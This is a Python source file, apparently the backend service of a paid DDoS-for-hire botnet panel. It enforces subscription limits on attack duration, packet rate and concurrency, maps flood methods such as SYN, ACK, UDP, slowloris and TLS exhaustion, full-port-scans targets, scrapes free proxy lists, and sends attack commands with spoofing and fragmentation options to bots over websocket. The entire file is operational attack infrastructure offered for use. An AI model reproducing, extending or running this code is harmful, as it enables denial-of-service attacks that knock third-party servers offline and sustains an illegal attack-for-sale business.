from datetime import datetime, timezone, timedelta
from typing import Optional, List
from uuid import UUID
from fastapi import HTTPException
from sqlalchemy import select, and_
from app.database import async_session
from app.models.all_models import AttackTask, Bot, User, Plan, UserSubscription
from app.schemas.all_schemas import AttackCreate
from app.services.bot_service import BotService
from app.websocket.bot_handler import manager
import asyncio, aiohttp

# ── Auto proxy fetcher ──
_proxy_cache = {"list": "", "ts": 0}
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/hyperhttp/proxy-lists/main/http.txt",
    "https://raw.githubusercontent.com/Eliweb3431/Proxy-List/main/http.txt",
    "https://raw.githubusercontent.com/sunny0676/Proxy-List/main/http.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/saschapes/Fresh-Proxy-List/main/http.txt",
    "https://raw.githubusercontent.com/BINGOWO/proxy_list/main/proxy.txt",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://api.openproxylist.xyz/http.txt",
]

async def fetch_free_proxies(limit=500):
    """Fetch free HTTP proxies from multiple sources. Cached 5 min."""
    now = datetime.now(timezone.utc).timestamp()
    if _proxy_cache["list"] and now - _proxy_cache["ts"] < 300:
        lines = _proxy_cache["list"].strip().split("\n")
        return "\n".join(lines[:limit]) if len(lines) > limit else _proxy_cache["list"]

    proxies = set()
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for url in PROXY_SOURCES:
            try:
                async with session.get(url) as r:
                    if r.status == 200:
                        text = await r.text()
                        for line in text.strip().split("\n"):
                            line = line.strip()
                            # Accept ip:port or protocol://ip:port
                            if "://" in line:
                                line = line.split("://", 1)[1]
                            if ":" in line and line.count(".") >= 3:
                                proxies.add(line)
                            if len(proxies) >= limit * 2:
                                break
            except Exception:
                continue
            if len(proxies) >= limit * 2:
                break

    result = "\n".join(list(proxies)[:limit])
    _proxy_cache["list"] = result
    _proxy_cache["ts"] = now
    print(f"[proxy] Fetched {len(proxies)} proxies, sending {min(len(proxies), limit)}")
    return result

def _normalize_method(m: str) -> str:
    """Map legacy / alias method names to current bot methods."""
    u = (m or "PSPE").upper().strip()
    if u in ("MEGA", "PORT", "SCAN", "UDP"):
        return "PSPE"
    if u in ("TLS_EXHAUST", "SSL"):
        return "TLS"
    if u in ("SLOWLORIS", "SLOW", "HTTPS", "HTTP_PROXY", "PROXY", "WEB"):
        return "HTTP"
    if u in ("MYSQL", "SQL", "MARIADB", "MYSQLD", "SYN", "SYNFLOOD", "ACK"):
        return "TCP"
    if u in ("NRO",):
        return "GAME"
    if u in ("PSPE", "TCP", "TLS", "HTTP", "GAME"):
        return u
    return u


def _normalize_plan_methods(raw) -> list:
    out = []
    for m in (raw or []):
        n = _normalize_method(m)
        if n in ("PSPE", "TCP", "TLS", "HTTP", "GAME") and n not in out:
            out.append(n)
    return out or ["PSPE", "TCP", "TLS", "HTTP", "GAME"]


class AttackService:
    @staticmethod
    async def launch(user: User, data: AttackCreate) -> AttackTask:
        is_admin = (user.role or "") == "admin"
        # Normalize method early so plan/bot checks use current names
        data.method = _normalize_method(data.method)

        async with async_session() as s:
            plan = None
            max_concurrent = 10
            max_secs = 3600
            max_pps = 100_000_000  # admin: no limit
            allowed = None
            cooldown = 0

            if not is_admin:
                sub_r = await s.execute(select(UserSubscription).where(and_(
                    UserSubscription.user_id == user.id,
                    UserSubscription.status == "active",
                )))
                sub = sub_r.scalar_one_or_none()
                if not sub:
                    raise HTTPException(403, "No active subscription. Buy a plan first.")
                if sub.expires_at and sub.expires_at < datetime.now(timezone.utc):
                    raise HTTPException(403, "Subscription expired.")

                plan_r = await s.execute(select(Plan).where(Plan.id == sub.plan_id))
                plan = plan_r.scalar_one_or_none()
                if not plan:
                    raise HTTPException(400, "Plan not found")

                max_concurrent = plan.max_concurrent
                max_secs = plan.max_attack_secs
                max_pps = plan.max_pps_per_bot
                allowed = _normalize_plan_methods(plan.allowed_methods)
                cooldown = plan.cooldown_secs or 0

                if data.duration_secs > max_secs:
                    raise HTTPException(400, f"Duration exceeds plan limit ({max_secs}s)")
                if data.pps_per_bot > max_pps:
                    raise HTTPException(400, f"PPS exceeds plan limit ({max_pps})")
                if allowed and data.method not in allowed:
                    raise HTTPException(
                        400,
                        f"Method '{data.method}' not allowed. Plan allows: {', '.join(allowed)}",
                    )

                recent = (await s.execute(
                    select(AttackTask).where(AttackTask.user_id == user.id)
                    .order_by(AttackTask.created_at.desc()).limit(1)
                )).scalar_one_or_none()
                if recent and recent.completed_at and cooldown:
                    cd_end = recent.completed_at + timedelta(seconds=cooldown)
                    if cd_end > datetime.now(timezone.utc):
                        left = int((cd_end - datetime.now(timezone.utc)).total_seconds())
                        raise HTTPException(429, f"Cooldown: {left}s remaining")

                active_n = (await s.execute(select(AttackTask).where(
                    AttackTask.user_id == user.id, AttackTask.status == "running"
                ))).scalars().all()
                if len(list(active_n)) >= (plan.max_concurrent if plan else 1):
                    raise HTTPException(429, "Max concurrent attacks reached for your plan")

            available = await BotService.get_available_bots(
                data.bot_count if data.bot_count > 1 else max_concurrent, [data.method],
                user_id=None if is_admin else user.id,
            )
            # Admin can use any online bot
            if is_admin and not available:
                async with async_session() as s2:
                    r = await s2.execute(
                        select(Bot).where(Bot.status == "online").limit(max_concurrent)
                    )
                    available = list(r.scalars().all())

            if not available:
                # Queue the attack — will auto-launch when bots free up
                from app.models.all_models import AttackQueue
                async with async_session() as s2:
                    q = AttackQueue(
                        user_id=user.id,
                        target_host=data.target_host,
                        target_port=data.target_port,
                        method=data.method,
                        duration_secs=data.duration_secs,
                        pps_per_bot=data.pps_per_bot,
                        bot_count=min(data.bot_count, max_concurrent),
                        status="queued",
                    )
                    s2.add(q)
                    await s2.commit()
                raise HTTPException(202, f"No bots available — attack queued (#{q.id})")

            bot_ids = [b.id for b in available]
            task = AttackTask(
                user_id=user.id,
                target_host=data.target_host,
                target_port=data.target_port,
                method=data.method,
                duration_secs=data.duration_secs,
                pps_per_bot=data.pps_per_bot,
                spoof_mode=data.spoof_mode,
                fragmentation=data.fragmentation,
                slowloris=data.slowloris,
                tls_exhaust=data.tls_exhaust,
                mega_mode=data.mega_mode,
                status="pending",
                bot_ids=bot_ids,
                started_at=datetime.now(timezone.utc),
            )
            s.add(task)
            await s.commit()
            await s.refresh(task)

            method = data.method.upper()

            # HTTP/TLS now hit origin directly (connection pool + slowloris drip)
            # — no proxy chain needed, bot ignores proxies field.
            proxy_list = data.proxies or ""

            # ── Port list for bots ─────────────────────────────────────────
            # Default: only user-set target_port (+ optional extra_ports).
            # scan_ports=True: C2 full-scans 1..65535, bots only hit open ports.
            extras = [data.target_port]
            if getattr(data, "extra_ports", None):
                for tok in (data.extra_ports or "").replace(" ", "").split(","):
                    if tok.isdigit():
                        extras.append(int(tok))
            open_ports_str = ",".join(str(p) for p in sorted(set(extras)))

            if getattr(data, "scan_ports", False):
                from app.services.port_scanner import scan_ports, format_ports
                try:
                    found = await scan_ports(
                        data.target_host,
                        full=True,
                        include_always=extras,
                        concurrency=1000,
                        timeout=0.3,
                    )
                    if found:
                        open_ports_str = format_ports(found)
                        print(f"[atk] scan {data.target_host}: {len(found)} open → bots")
                except Exception as e:
                    print(f"[atk] scan failed: {e}, fallback to ports {open_ports_str}")

            delivered = 0
            for bot in available:
                try:
                    await manager.send_attack_command(str(bot.id), {
                        "id": str(task.id),
                        "target": data.target_host,
                        "port": data.target_port,
                        "method": method,
                        "duration": data.duration_secs,
                        "pps": data.pps_per_bot,
                        "threads": bot.max_threads or 100,
                        "spoof_mode": data.spoof_mode,
                        "fragmentation": int(data.fragmentation),
                        "slowloris": int(data.slowloris or method == "SLOWLORIS"),
                        "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST" or method == "TLS"),
                        "mega_mode": int(data.mega_mode or method == "PSPE" or method == "MEGA"),
                        "payload": data.payload or "",
                        "proxies": proxy_list,
                        "open_ports": open_ports_str,  # "80,443,3389,1433,..."
                    })
                    delivered += 1
                except Exception as e:
                    print(f"[atk] failed to send to bot {bot.id}: {e}")

            if delivered == 0:
                task.status = "failed"
                await s.commit()
                raise HTTPException(503, "No bots could be reached to deliver command")

            task.status = "running"
            await s.commit()
            return task

    @staticmethod
    async def stop(task_id: UUID, user: User):
        async with async_session() as s:
            task = (await s.execute(
                select(AttackTask).where(AttackTask.id == task_id, AttackTask.status == "running")
            )).scalar_one_or_none()
            if not task:
                raise HTTPException(404, "Task not running")
            if user.role != "admin" and task.user_id != user.id:
                raise HTTPException(403, "Not your attack")
            task.status = "completed"
            task.completed_at = datetime.now(timezone.utc)
            await s.commit()
            for bid in (task.bot_ids or []):
                try:
                    await manager.send_stop_command(str(bid), str(task_id))
                except Exception:
                    pass
            # Webhook notification
            try:
                from app.services.background_service import send_webhook
                await send_webhook(
                    "Attack Complete",
                    f"Target: {task.target_host}:{task.target_port}\n"
                    f"Method: {task.method}\n"
                    f"Packets: {task.total_packets:,}\n"
                    f"Duration: {task.duration_secs}s"
                )
            except Exception:
                pass

    @staticmethod
    async def get_user_tasks(user_id: UUID) -> List[AttackTask]:
        async with async_session() as s:
            r = await s.execute(
                select(AttackTask).where(AttackTask.user_id == user_id)
                .order_by(AttackTask.created_at.desc()).limit(100)
            )
            return list(r.scalars().all())

    @staticmethod
    async def get_active_tasks(user_id: Optional[UUID] = None) -> List[AttackTask]:
        async with async_session() as s:
            conds = [AttackTask.status == "running"]
            if user_id:
                conds.append(AttackTask.user_id == user_id)
            r = await s.execute(select(AttackTask).where(and_(*conds)))
            return list(r.scalars().all())
